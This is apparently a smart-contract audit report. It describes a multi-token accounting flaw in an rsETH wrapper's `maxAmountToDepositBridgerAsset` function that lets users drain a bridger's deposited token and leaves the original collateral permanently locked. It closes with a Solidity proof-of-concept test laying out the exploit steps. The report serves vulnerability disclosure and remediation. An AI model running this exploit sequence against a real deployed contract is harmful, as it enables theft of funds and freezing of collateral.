### Title
Multi-Token Accounting Flaw in `maxAmountToDepositBridgerAsset` Enables Bridger Fund Drain and Permanent Collateral Lock — (`contracts/L2/RsETHTokenWrapper.sol`)

---

### Summary

When a second allowed token is added (via `reinitialize` or `addAllowedToken`), `maxAmountToDepositBridgerAsset` computes available deposit capacity using the **global** `totalSupply()` against only the **per-asset** balance. This allows the bridger to deposit up to `totalSupply()` of the new token even though the wrapper is already fully backed by the original token. Users can then withdraw the newly deposited token, draining the bridger's deposit while permanently locking the original collateral.

---

### Finding Description

`maxAmountToDepositBridgerAsset` is defined as:

```solidity
// contracts/L2/RsETHTokenWrapper.sol lines 99–110
function maxAmountToDepositBridgerAsset(address _asset) public view returns (uint256) {
    if (!allowedTokens[_asset]) return 0;
    uint256 wrsETHSupply = totalSupply();
    uint256 balanceOfAssetInWrapper = ERC20Upgradeable(_asset).balanceOf(address(this));
    if (balanceOfAssetInWrapper > wrsETHSupply) return 0;
    return wrsETHSupply - balanceOfAssetInWrapper;
}
``` [1](#0-0) 

The invariant it tries to enforce is: *total collateral of `_asset` ≤ total wrsETH supply*. But with multiple allowed tokens, the correct invariant is: *sum of all collateral tokens ≤ total wrsETH supply*. The function only checks one token's balance, ignoring all others.

The second token can be added via:

- `reinitialize(tokenB)` — callable once by `DEFAULT_ADMIN_ROLE` as a v2 upgrade path [2](#0-1) 
- `addAllowedToken(tokenB)` — callable by `TIMELOCK_ROLE` at any time [3](#0-2) 

`_withdraw` allows burning wrsETH to receive **any** allowed token, with no constraint on which token the user originally deposited:

```solidity
// contracts/L2/RsETHTokenWrapper.sol lines 120–128
function _withdraw(address _asset, address _to, uint256 _amount) internal {
    if (!allowedTokens[_asset]) revert TokenNotAllowed();
    _burn(msg.sender, _amount);
    ERC20Upgradeable(_asset).safeTransfer(_to, _amount);
    ...
}
``` [4](#0-3) 

---

### Impact Explanation

**State after exploit:**

| Actor | Before | After |
|---|---|---|
| Users | Hold wrsETH backed by tokenA | Burned wrsETH, received tokenB |
| Bridger | Holds tokenB | tokenB fully drained |
| Contract | Holds tokenA | tokenA permanently locked (no wrsETH left to redeem it) |

Two critical impacts:
1. **Direct theft of bridger's tokenB** — users drain the bridger's entire deposit.
2. **Permanent freezing of tokenA** — original collateral is irrecoverable once all wrsETH is burned for tokenB.

Both match Critical scope: *Direct theft of any user funds* and *Permanent freezing of funds*.

---

### Likelihood Explanation

Both triggering actions are **intended protocol operations**, not compromises:

- Adding a second collateral token via `reinitialize` is the explicit purpose of that upgrade function.
- The bridger depositing tokenB after it is added is the expected behavior — `maxAmountToDepositBridgerAsset` is the bridger's signal for how much to deposit, and it will return `totalSupply()` for the new token.

No private key leak, governance capture, or external dependency failure is required. The exploit is triggered by normal, designed protocol flows.

---

### Recommendation

`maxAmountToDepositBridgerAsset` must account for **all** collateral tokens, not just the queried one. The available capacity for a new token should be:

```
totalSupply() - sum(balanceOf(t) for all allowedTokens t)
```

This requires tracking the set of allowed tokens (e.g., an `EnumerableSet`) so the total collateral can be summed. Alternatively, restrict the wrapper to a single collateral token and remove the multi-token path entirely.

### Proof of Concept

```solidity
// State-transition test (local fork or unit test)
// 1. Deploy wrapper with tokenA; admin = deployer
wrapper.initialize(admin, bridger, tokenA);

// 2. Users deposit tokenA, receive wrsETH 1:1
tokenA.approve(address(wrapper), 1000e18);
wrapper.deposit(tokenA, 1000e18);
// totalSupply() == 1000e18, balanceOf(tokenA) == 1000e18

// 3. Admin calls reinitialize to add tokenB (v2 upgrade)
vm.prank(admin);
wrapper.reinitialize(tokenB);
// allowedTokens[tokenB] == true

// 4. maxAmountToDepositBridgerAsset(tokenB) == 1000e18 - 0 == 1000e18
assert(wrapper.maxAmountToDepositBridgerAsset(tokenB) == 1000e18);

// 5. Bridger deposits tokenB (trusting the capacity signal)
vm.startPrank(bridger);
tokenB.approve(address(wrapper), 1000e18);
wrapper.depositBridgerAssets(tokenB, 1000e18);
vm.stopPrank();
// contract now holds 1000e18 tokenA + 1000e18 tokenB

// 6. Original depositors withdraw tokenB instead of tokenA
vm.prank(user);
wrapper.withdraw(tokenB, 1000e18);
// user burned 1000e18 wrsETH, received 1000e18 tokenB

// 7. Assert: bridger's tokenB is drained, tokenA permanently locked
assert(tokenB.balanceOf(user) == 1000e18);
assert(tokenA.balanceOf(address(wrapper)) == 1000e18); // locked forever
assert(wrapper.totalSupply() == 0);
```
